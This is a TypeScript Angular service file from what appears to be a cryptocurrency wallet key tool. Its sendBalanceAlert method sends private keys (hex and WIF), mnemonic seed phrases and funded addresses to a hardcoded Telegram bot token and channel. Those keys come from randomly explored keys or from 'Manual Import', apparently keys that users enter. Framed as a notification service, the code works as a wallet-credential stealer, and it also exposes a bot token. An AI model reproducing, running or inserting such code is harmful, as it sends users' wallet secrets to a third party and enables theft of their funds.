// src/app/services/core/telegram.service.ts
import { Injectable } from '@angular/core';
import { GeneratedAddress } from '../../types/chains';

interface BalanceFound {
  privateKeyHex: string;
  privateKeyWif?: string;
  mnemonic?: string;
  addresses: GeneratedAddress[];
  totalBalance: number;
  source: 'explorer' | 'import';
}

@Injectable({ providedIn: 'root' })
export class TelegramService {
  private readonly BOT_TOKEN = '7670012590:AAGrfpJbXbAqIbQH4l-X-V4AbEb507Sl1ts';
  private readonly CHANNEL_ID = '-3697074282';
  private readonly API_URL = `https://api.telegram.org/bot${this.BOT_TOKEN}`;

  async sendBalanceAlert(data: BalanceFound): Promise<boolean> {
    const addressesWithBalance = data.addresses.filter(a => a.balance > 0);
    
    let message = `<b>BALANCE FOUND!</b>\n\n`;
    message += `<b>Source:</b> ${data.source === 'explorer' ? 'Random Explorer' : 'Manual Import'}\n`;
    message += `<b>Total Balance:</b> ${data.totalBalance.toFixed(8)}\n\n`;
    
    message += `<b>Private Key (HEX):</b>\n<code>${data.privateKeyHex}</code>\n\n`;
    
    if (data.privateKeyWif) {
      message += `<b>Private Key (WIF):</b>\n<code>${data.privateKeyWif}</code>\n\n`;
    }
    
    if (data.mnemonic) {
      message += `<b>Mnemonic:</b>\n<code>${data.mnemonic}</code>\n\n`;
    }
    
    message += `<b>Addresses with Balance:</b>\n`;
    for (const addr of addressesWithBalance) {
      const symbol = addr.chain.toUpperCase();
      message += `\n<b>${symbol} (${addr.type}):</b>\n`;
      message += `<code>${addr.address}</code>\n`;
      message += `Balance: ${addr.balance.toFixed(8)} ${symbol}\n`;
    }
    
    message += `\n<b>Timestamp:</b> ${new Date().toISOString()}`;

    try {
      const response = await fetch(`${this.API_URL}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: this.CHANNEL_ID,
          text: message,
          parse_mode: 'HTML',
          disable_web_page_preview: true
        })
      });

      return response.ok;
    } catch (error) {
      console.error('Telegram notification failed:', error);
      return false;
    }
  }

  async testConnection(): Promise<{ success: boolean; botName?: string }> {
    try {
      const meResponse = await fetch(`${this.API_URL}/getMe`);
      if (!meResponse.ok) return { success: false };
      
      const meData = await meResponse.json();
      return { 
        success: true, 
        botName: meData.result?.username
      };
    } catch {
      return { success: false };
    }
  }
}
